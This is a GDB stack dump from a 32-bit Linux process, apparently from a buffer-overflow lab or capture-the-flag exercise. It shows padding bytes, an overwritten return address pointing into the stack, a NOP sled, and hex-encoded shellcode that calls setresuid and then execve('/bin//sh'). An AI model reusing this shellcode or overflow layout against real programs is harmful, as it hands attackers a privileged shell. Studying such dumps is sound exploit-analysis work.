(gdb) x/48xw $sp
0xffffcf70:	0xffffcf8c	0xffffd25a	0xf7df8239	0xf7fa0808
0xffffcf80:	0xf7f9d000	0xf7f9d000	0x00000000	0x67756f63
0xffffcf90:	0x30737261	0x34333231	0x38373635	0x34333231
0xffffcfa0:	0x38373635	0x34333231	0x38373635	0xffffd010
0xffffcfb0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcfc0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcfd0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcfe0:	0x90909090	0x90909090	0xdb31c031	0xb099c931
0xffffcff0:	0x6a80cda4	0x6851580b	0x68732f2f	0x69622f68
0xffffd000:	0x51e3896e	0x8953e289	0x0080cde1	0x00000000
0xffffd010:	0x00000000	0x00000000	0x00000002	0x080483c0
0xffffd020:	0x00000000	0xf7fead50	0xf7fe5960	0xf7ffd000
